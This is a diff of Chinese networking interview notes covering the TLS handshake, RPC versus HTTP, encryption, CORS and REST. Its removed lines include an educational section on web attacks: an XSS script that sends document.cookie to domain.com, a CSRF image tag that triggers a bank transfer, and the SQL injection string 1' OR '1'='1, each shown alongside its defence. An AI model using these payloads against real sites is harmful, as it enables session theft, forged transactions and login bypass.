 <li>支持的协议版本，比如TLS 1.0版。</li>
 <li>一个客户端生成的随机数 random1，稍后用于生成”对话密钥”。</li>
 <li>支持的加密方法，比如RSA公钥加密。</li>
 <li>支持的压缩方法。</li>
 </ul>
-<p>服务器收到请求,然后响应，响应流程如下：</p>
+<p>服务器收到请求后进行响应。响应流程如下：</p>
 <ul>
 <li>确认使用的加密通信协议版本，比如TLS 1.0版本。如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。</li>
 <li>发送一个服务器生成的随机数random2，稍后用于生成”对话密钥”。</li>
@@ -1098,9 +1259,12 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 <ol>
 <li>我们知道 CA 机构在签发证书的时候，都会使用自己的私钥对证书进行签名</li>
 <li>证书里的签名算法字段（例如： sha256RSA） 表示，CA 机构使用 sha256 对证书进行摘要，然后使用 RSA 算法对摘要进行私钥签名，而我们也知道 RSA 算法中，使用私钥签名之后，只有公钥才能进行验签。</li>
-<li>如果我们使用的是购买的证书，那么很有可能，颁发这个证书的 CA 机构的公钥已经预置在操作系统中。这样浏览器就可以使用 CA 机构的公钥对服务器的证书进行验签。确定这个证书是不是由正规的 CA 机构颁发的。验签之后得到 CA 机构使用 sha256 得到的证书摘要，然后客户端再使用 sha256 对证书内容进行一次摘要，如果得到的值和验签之后得到的摘要值相同，则表示证书没有被修改过。</li>
+<li>客户端（浏览器）的”证书管理器”，有”受信任的根证书颁发机构”列表。客户端会根据这张列表，查看解开数字证书的公钥是否在列表之内。如果我们使用的是购买的证书，那么很有可能，颁发这个证书的 CA 机构的公钥已经预置在操作系统中。这样浏览器就可以使用 CA 机构的公钥对服务器的证书进行验签。确定这个证书是不是由正规的 CA 机构颁发的。验签之后得到 CA 机构使用 sha256 得到的证书摘要，然后客户端再使用 sha256 对证书内容进行一次摘要，如果得到的值和验签之后得到的摘要值相同，则表示证书没有被修改过。</li>
 <li>如果验证通过，就会显示安全字样，如果服务器购买的证书是更高级的 EV 类型，就会显示出购买证书的时候提供的企业名称。如果没有验证通过，就会显示不安全的提示。</li>
 </ol>
+<blockquote>
+<p>传输层安全性协定 TLS（Transport Layer Security），及其前身安全套接层 SSL（Secure Sockets Layer）是一种安全协议，目的是为网际网路通信，提供安全及数据完整性保障。</p>
+</blockquote>
 <p>再然后客户端会生成随机数：</p>
 <p>验证通过之后，客户端会生成一个随机数 <code>pre-master secret</code>，然后使用证书中的公钥进行加密，然后传递给服务器端</p>
 <p>PreMaster secret </p>
@@ -1150,118 +1314,7 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 </tbody></table>
 <p>然后在后续的交互中就使用 session Key 和 MAC 算法的秘钥对传输的内容进行加密和解密。</p>
 <p>具体的步骤是先使用 MAC 秘钥对内容进行摘要，然后把摘要放在内容的后面使用 sessionKey 再进行加密。对于客户端发送的数据，服务器端收到之后，需要先使用 <code>client_write_key</code> 进行解密，然后使用 <code>client_write_MAC_key</code> 对数据完整性进行验证。服务器端发送的数据，客户端会使用 <code>server_write_key</code> 和 <code>server_write_MAC_key</code> 进行相同的操作。</p>
-<h1 id="20-网络攻击手段有哪些？"><a href="#20-网络攻击手段有哪些？" class="headerlink" title="20. 网络攻击手段有哪些？"></a>20. 网络攻击手段有哪些？</h1><h2 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p>
-<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
-<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">"//domain.com/?c="</span> + <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
-<p>之后该内容可能会被渲染成以下形式：</p>
-<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">"//domain.com/?c="</span> + <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
-<p>另一个用户浏览了含有这个内容的页面将会跳转到 <code>domain.com</code> 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
-<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
-<li>窃取用户的 Cookie</li>
-<li>伪造虚假的输入表单骗取个人信息</li>
-<li>显示伪造的文章或者图片</li>
-</ul>
-<h3 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h3><ol>
-<li>设置 Cookie 为 <code>HttpOnly</code>: 设置了 <code>HttpOnly</code> 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 <code>document.cookie</code> 获取用户 Cookie 信息。</li>
-<li>过滤特殊字符: 例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</li>
-</ol>
-<p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p>
-<p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p>
-<p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p>
-<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"title"</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"q"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"test"</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="javascript"><br>alert(<span class="hljs-regexp">/xss/</span>);<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
-<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>&amp;lt;form&amp;gt;<br>  &amp;lt;input type="text" name="q" value="test"&amp;gt;<br>&amp;lt;/form&amp;gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br><br>&amp;lt;script type="text/javascript"&amp;gt;<br>alert(/xss/);<br>&amp;lt;/script&amp;gt;<br></code></pre></div></td></tr></table></figure>
-<h2 id="跨站请求伪造"><a href="#跨站请求伪造" class="headerlink" title="跨站请求伪造"></a>跨站请求伪造</h2><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p>
-<p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p>
-<h3 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理:"></a>攻击原理:</h3><p>假如一家银行用以执行转账操作的 URL 地址如下： <code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName</code>。<br>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p>
-<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman"</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
-<p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p>
-<p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
-<p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
-<h3 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h3><h4 id="1-检查-Referer-首部字段"><a href="#1-检查-Referer-首部字段" class="headerlink" title="1. 检查 Referer 首部字段"></a>1. 检查 Referer 首部字段</h4><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p>
-<p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p>
-<h4 id="2-添加校验-Token"><a href="#2-添加校验-Token" class="headerlink" title="2. 添加校验 Token"></a>2. 添加校验 Token</h4><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p>
-<h4 id="3-输入验证码"><a href="#3-输入验证码" class="headerlink" title="3. 输入验证码"></a>3. 输入验证码</h4><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p>
-<h2 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h2><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p>
-<h3 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>例如一个网站登录验证的 SQL 查询代码为：</p>
-<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">strSQL = <span class="hljs-string">"SELECT * FROM users WHERE (name = '"</span> + userName + <span class="hljs-string">"') and (pw = '"</span>+ passWord +<span class="hljs-string">"');"</span><br></code></pre></div></td></tr></table></figure>
-<p>如果填入以下内容：</p>
-<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">userName</span> = <span class="hljs-string">"1' OR '1'='1"</span><span class="hljs-comment">;</span><br><span class="hljs-attr">passWord</span> = <span class="hljs-string">"1' OR '1'='1"</span><span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure>
-<p>那么 SQL 查询字符串为：</p>
-<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">strSQL = <span class="hljs-string">"SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"</span><br></code></pre></div></td></tr></table></figure>
-<p>此时无需验证通过就能执行以下查询：</p>
-<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">strSQL = <span class="hljs-string">"SELECT * FROM users;"</span><br></code></pre></div></td></tr></table></figure>
-
-<h3 id="防范手段-2"><a href="#防范手段-2" class="headerlink" title="防范手段"></a>防范手段</h3><h4 id="1-使用参数化查询"><a href="#1-使用参数化查询" class="headerlink" title="1. 使用参数化查询"></a>1. 使用参数化查询</h4><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p>
-<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">PreparedStatement stmt = connection.prepareStatement(<span class="hljs-string">"SELECT * FROM users WHERE userid=? AND password=?"</span>);<br>stmt.setString(<span class="hljs-number">1</span>, userid);<br>stmt.setString(<span class="hljs-number">2</span>, password);<br>ResultSet rs = stmt.executeQuery();<br></code></pre></div></td></tr></table></figure>
-<h4 id="2-单引号转换"><a href="#2-单引号转换" class="headerlink" title="2. 单引号转换"></a>2. 单引号转换</h4><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p>
-<h2 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h2><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
-<p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>
-<h1 id="21-HTTP和RPC区别？（服务之间的调用为啥不直接用-HTTP-而用-RPC？）"><a href="#21-HTTP和RPC区别？（服务之间的调用为啥不直接用-HTTP-而用-RPC？）" class="headerlink" title="21. HTTP和RPC区别？（服务之间的调用为啥不直接用 HTTP 而用 RPC？）"></a>21. HTTP和RPC区别？（服务之间的调用为啥不直接用 HTTP 而用 RPC？）</h1><p>RPC（Remote Procedure Call）—远程过程调用，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。比如两个不同的服务 A、B 部署在两台不同的机器上，那么服务 A 如果想要调用服务 B 中的某个方法该怎么办呢？使用 HTTP请求当然可以，但是可能会比较慢而且一些优化做的并不好。 RPC 的出现就是为了解决这个问题。</p>
-<p><strong>RPC 原理</strong>：</p>
-<p><img src="https://qiniu.xiaoming.net.cn/RPC%E5%8E%9F%E7%90%86.jpeg" alt="RPC原理"></p>
-<ol>
-<li>服务消费方（client）调用以本地调用方式调用服务；</li>
-<li>client stub接收到调用后负责将方法、参数等组装成能够进行网络传输的消息体；</li>
-<li>client stub找到服务地址，并将消息发送到服务端；</li>
-<li>server stub收到消息后进行解码；</li>
-<li>server stub根据解码结果调用本地的服务；</li>
-<li>本地服务执行并将结果返回给server stub；</li>
-<li>server stub将返回结果打包成消息并发送至消费方；</li>
-<li>client stub接收到消息，并进行解码；</li>
-<li>服务消费方得到最终结果。</li>
-</ol>
-<p><img src="https://qiniu.xiaoming.net.cn/RPC%E6%97%B6%E5%BA%8F%E5%9B%BE.jpeg" alt="RPC时序图"></p>
-<p>RPC主要解决的问题：<strong>让分布式或者微服务系统中不同服务之间的调用像本地调用一样简单。</strong></p>
-<p>RPC 只是一种概念、一种设计，就是为了解决不同服务之间的调用问题,它一般会包含有<strong>传输协议</strong>和<strong>序列化协议</strong>这两个。</p>
-<p>实现 RPC 的传输协议可以直接建立在 TCP 之上，也可以建立在 HTTP 协议之上。大部分 RPC 框架都是使用的 TCP 连接（gRPC使用了HTTP2）。</p>
-<blockquote>
-<p>通常谈计算机网络的五层协议的体系结构是指：应用层、传输层、网络层、数据链路层、物理层。<br><strong>应用层(application-layer）的任务是通过应用进程间的交互来完成特定网络应用</strong>。HTTP 属于应用层协议，它会基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过 URL 向HTTP服务端即 WEB 服务器发送所有请求。Web 服务器根据接收到的请求后，向客户端发送响应信息。HTTP协议建立在 TCP 协议之上。<br>运输层(transport layer)的主要任务就是负责向两台主机进程之间的通信提供通用的数据传输服务。TCP是传输层协议，主要解决数据如何在网络中传输。相比于UDP,TCP 提供的是面向连接的，可靠的数据传输服务。</p>
-</blockquote>
-<p>RPC 和 HTTP 主要关键区别就在 <strong>HTTP 使用的 TCP 协议，和 RPC 自定义的 TCP 协议在报文上的区别</strong>。</p>
-<p>http1.1协议的 TCP 报文包含太多在传输过程中可能无用的信息：</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK <br>Content-Type: text/plain<br>Content-Length: <span class="hljs-number">137582</span><br>Expires: Thu, <span class="hljs-number">05</span> Dec <span class="hljs-number">1997</span> <span class="hljs-number">16</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT<br>Last-Modified: Wed, <span class="hljs-number">5</span> August <span class="hljs-number">1996</span> <span class="hljs-number">15</span>:<span class="hljs-number">55</span>:<span class="hljs-number">28</span> GMT<br>Server: Apache <span class="hljs-number">0.84</span><br><br>&lt;html&gt;<br>  &lt;body&gt;Hello World&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></div></td></tr></table></figure>
-<p>使用自定义 TCP 协议进行传输就会避免上面这个问题，极大地减轻了传输数据的开销。 这也就是为什么通常会采用自定义 TCP 协议的 RPC 来进行进行服务调用的真正原因。除此之外，成熟的 RPC 框架还提供好了“服务自动注册与发现”、“智能负载均衡”、“可视化的服务治理和运维”、“运行期流量调度”等等功能，这些也算是选择 RPC 进行服务注册和发现的一方面原因。</p>
-<h1 id="22-对称加密与非对称加密"><a href="#22-对称加密与非对称加密" class="headerlink" title="22. 对称加密与非对称加密"></a>22. 对称加密与非对称加密</h1><h2 id="对称加密和非对称加密"><a href="#对称加密和非对称加密" class="headerlink" title="对称加密和非对称加密"></a>对称加密和非对称加密</h2><p><strong>对称加密</strong>：A与 B 之间之间的通讯数据都用同一套的密钥来进行加密解密。</p>
-<p>优点：</p>
-<ul>
-<li>简单快捷，密钥较短，且破译困难。</li>
-</ul>
-<p>缺点：</p>
-<ul>
-<li>如果用户一旦多的话，管理密钥也是一种困难。不方便直接沟通的两个用户之间怎么确定密钥也需要考虑，这其中就会有密钥泄露的风险，以及存在更换密钥的需求。</li>
-</ul>
-<p>对称加密通常有 DES,IDEA,3DES 加密算法。</p>
-<p><strong>非对称加密</strong>：用公钥和私钥来加解密的算法。打个比方，A 的公钥加密过的东西只能通过 A 的私钥来解密；同理，A 的私钥加密过的东西只能通过 A 的公钥来解密。顾名思义，公钥是公开的，别人可以获取的到；私钥是私有的，只能自己拥有。</p>
-<p>缺点：</p>
-<ul>
-<li>加解密比对称加密耗时.</li>
-</ul>
-<p>优点：</p>
-<ul>
-<li>比对称加密安全.</li>
-</ul>
-<p>但是非对称加密也是存在漏洞，因为公钥是公开的，如果有 C 冒充 B 的身份利用 A 的公钥给 A 发消息，这样就乱套了，所以接下来就采用<strong>非对称加密+摘要算法+数字签名</strong>的机制来确保传输安全。</p>
-<p>常见的非对称加密算法有：RSA、ECC（移动设备用）、Diffie-Hellman、El Gamal、DSA（数字签名用）</p>
-<h2 id="Hash算法（摘要算法）"><a href="#Hash算法（摘要算法）" class="headerlink" title="Hash算法（摘要算法）"></a>Hash算法（摘要算法）</h2><p>Hash 算法的特点是单向不可还原，用户可以通过 hash 算法对目标信息生成一段特定长度的唯一 hash 值，却不能通过这个 hash 值重新获得目标信息。因此 Hash 算法常用在不可还原的密码存储、信息完整性校验等。只要源数据不同，算法得到的摘要必定不同。</p>
-<p>常见的 Hash 算法有 MD2、MD4、MD5、HAVAL、SHA</p>
-<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名用来，保证信息传输的完整性、发送者的身份认证、防止交易中的抵赖发生。<br>数字签名是 A 将原始明文通过 hash 算法得到摘要，这个摘要是不可逆的；将明文加密，连同摘要加密后一起发送给 B；B 接收到后解密，得到这个摘要 a 和加密的明文，再将加密明文解密得到原始明文，然后通过同一 hash 算法得到新的摘要 b，比较 a 与 b 就可得知在传输过程中是否被更改过。</p>
-<p>因此数字签名能够验证信息的完整性。如果中途数据被纂改或者丢失。那么对方就可以根据数字签名来辨别是否是来自对方的第一手信息数据。</p>
-<h2 id="完整的非对称加密过程"><a href="#完整的非对称加密过程" class="headerlink" title="完整的非对称加密过程"></a>完整的非对称加密过程</h2><p>假如现在你向支付宝转账（术语数据信息），为了保证信息传送的保密性、真实性、完整性和不可否认性，需要对传送的信息进行数字加密和签名，其传送过程为：</p>
-<ol>
-<li>首先你要确认是否是支付宝的数字证书，如果确认为支付宝身份后，则对方真实可信。可以向对方传送信息，</li>
-<li>你准备好要传送的数字信息（明文）计算要转的多少钱，对方支付宝账号等；</li>
-<li>你对数字信息进行哈希运算，得到一个信息摘要（客户端主要职责）；</li>
-<li>你用自己的私钥对信息摘要进行加密得到你的数字签名，并将其附在数字信息上；</li>
-<li>你随机产生一个加密密钥，并用此密码对要发送的信息进行加密（密文）；</li>
-<li>你用支付宝的公钥对刚才随机产生的加密密钥进行加密，将加密后的 DES 密钥连同密文一起传送给支付宝；</li>
-<li>支付宝收到你传送来的密文和加密过的 DES 密钥，先用自己的私钥对加密的 DES 密钥进行解密，得到你随机产生的加密密钥；</li>
-<li>支付宝然后用随机密钥对收到的密文进行解密，得到明文的数字信息，然后将随机密钥抛弃；</li>
-<li>支付宝用你的公钥对你的的数字签名进行解密，得到信息摘要；</li>
-<li>支付宝用相同的哈希算法对收到的明文再进行一次哈希运算，得到一个新的信息摘要；</li>
-<li>支付宝将收到的信息摘要和新产生的信息摘要进行比较，如果一致，说明收到的信息没有被修改过。</li>
-<li>确定收到信息，然后进行向对方进行付款交易，一次非对称密过程结束。在这后面的流程就不属于本次非对称加密的范畴，算支付宝个人的自我流程，也就是循环以上过程。</li>
-</ol>
-<h1 id="23-跨域问题"><a href="#23-跨域问题" class="headerlink" title="23. 跨域问题"></a>23. 跨域问题</h1><p>CORS 全称 Cross-Origin Resource Sharing，意为跨域资源共享。当一个资源去访问另一个不同域名或者同域名不同端口的资源时，就会发出跨域请求。如果此时另一个资源不允许其进行跨域资源访问，那么访问的那个资源就会遇到跨域问题。</p>
+<h1 id="24-跨域问题"><a href="#24-跨域问题" class="headerlink" title="24. 跨域问题"></a>24. 跨域问题</h1><p>CORS 全称 Cross-Origin Resource Sharing，意为跨域资源共享。当一个资源去访问另一个不同域名或者同域名不同端口的资源时，就会发出跨域请求。如果此时另一个资源不允许其进行跨域资源访问，那么访问的那个资源就会遇到跨域问题。</p>
 <h2 id="跨域问题出现的原因"><a href="#跨域问题出现的原因" class="headerlink" title="跨域问题出现的原因"></a>跨域问题出现的原因</h2><p>之所以会出现跨域问题，是因为浏览器采用的同源策略。</p>
 <p>同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。</p>
 <p>如果两个页面的<strong>协议、端口（如果有指定）和主机</strong>都相同，则两个页面具有相同的源。也可以把它称为<code>协议/主机/端口 tuple</code>，或简单地叫做 “tuple”. (“tuple” ，“元”，是指一些事物组合在一起形成一个整体，比如（1，2）叫二元，（1，2，3）叫三元)。</p>
@@ -1368,7 +1421,7 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 <li>只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本。</li>
 </ul>
 <h3 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h3><p>浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所有域的资源再返回给客户端。</p>
-<h1 id="24-RESTful-架构"><a href="#24-RESTful-架构" class="headerlink" title="24. RESTful 架构"></a>24. RESTful 架构</h1><p>REST，即 Representational State Transfer 的缩写。对这个词组的翻译是”资源表现层状态转化”。</p>
+<h1 id="25-RESTful-架构"><a href="#25-RESTful-架构" class="headerlink" title="25. RESTful 架构"></a>25. RESTful 架构</h1><p>REST，即 Representational State Transfer 的缩写。对这个词组的翻译是”资源表现层状态转化”。</p>
 <p>如果一个架构符合REST原则，就称它为RESTful架构。</p>
 <p>所谓 <strong>资源</strong>，就是网络上的一个实体，或者说是网络上的一个具体信息。它可以是一段文本、一张图片、一首歌曲、一种服务，总之就是一个具体的实在。可以用一个 URI（统一资源定位符）指向它，每种资源对应一个特定的 URI。要获取这个资源，访问它的 URI 就可以，因此 URI 就成了每一个资源的地址或独一无二的识别符。</p>
 <p>所谓”上网”，就是与互联网上一系列的”资源”互动，调用它的URI。</p>
@@ -1384,7 +1437,7 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 <li>客户端和服务器之间，传递这种资源的某种表现层；</li>
 <li>客户端通过四个 HTTP 动词，对服务器端资源进行操作，实现”表现层状态转化”。</li>
 </ul>
-<h1 id="25-RestFul-和-RPC-的区别和应用场景"><a href="#25-RestFul-和-RPC-的区别和应用场景" class="headerlink" title="25. RestFul 和 RPC 的区别和应用场景"></a>25. RestFul 和 RPC 的区别和应用场景</h1><p>RestFul 和 RPC 都是网络交互的协议规范。通常用于多个微服务之间的通信协议。</p>
+<h1 id="26-RestFul-和-RPC-的区别和应用场景"><a href="#26-RestFul-和-RPC-的区别和应用场景" class="headerlink" title="26. RestFul 和 RPC 的区别和应用场景"></a>26. RestFul 和 RPC 的区别和应用场景</h1><p>RestFul 和 RPC 都是网络交互的协议规范。通常用于多个微服务之间的通信协议。</p>
 <p><img src="http://qiniu.xiaoming.net.cn/RestFul%E5%92%8CRPC%E6%AF%94%E8%BE%83.jpeg" alt="RestFul 和 RPC 比较"></p>
 <p>高与低是对实现两种规范框架的相对比较，但也不是绝对的，需要根据实际情况而定。</p>
 <h2 id="REST与RPC应用场景"><a href="#REST与RPC应用场景" class="headerlink" title="REST与RPC应用场景"></a>REST与RPC应用场景</h2><p>REST 和 RPC 都常用于微服务架构中。</p>
@@ -1395,7 +1448,7 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 </li>
 </ol>
 <p>所以，如果是后端两种语言互相调用，用 RPC 可以获得更好的性能（省去了 HTTP 报头等一系列东西），应该也更容易配置，如果是前端通过 AJAX 调用后端，那么用 REST API 的形式比较好。</p>
-<h1 id="26-TCP中的Nagle算法"><a href="#26-TCP中的Nagle算法" class="headerlink" title="26. TCP中的Nagle算法"></a>26. TCP中的Nagle算法</h1><p>在使用一些协议通讯的时候，会有一个字节一个字节的发送的情景，每次发送一个字节的有用数据，就会产生 41 个字节长的分组，20 个字节的 IP Header 和 20 个字节的 TCP Header，这就导致了 1 个字节的有用信息要浪费掉 40 个字节的头部信息，这是一笔巨大的字节开销，而且这种小包在广域网上会增加拥塞的出现。</p>
